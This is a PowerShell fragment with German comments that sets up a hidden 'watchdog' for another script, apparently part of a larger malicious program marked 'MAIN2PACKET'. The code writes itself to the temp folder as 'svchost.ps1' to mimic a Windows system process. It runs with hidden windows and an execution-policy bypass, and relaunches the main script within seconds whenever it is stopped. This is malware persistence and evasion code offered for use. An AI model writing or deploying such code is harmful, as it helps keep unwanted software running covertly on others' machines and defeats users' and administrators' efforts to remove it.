# Watchdog 1: Versteckter Prozess (Startet als anderer Prozessname)
$watchdog1 = @"
while(`$true) {
    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*" -or `$_.Name -like "*pwsh*"}
    `$found = `$false
    foreach(`$proc in `$p) {
        try {
            `$cmdLine = Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
            if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
                `$found = `$true
                break
            }
        } catch {}
    }
    if (-not `$found) {
        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 3
}
"@
$watchdog1 | Out-File "$env:TEMP\svchost.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\svchost.ps1`""

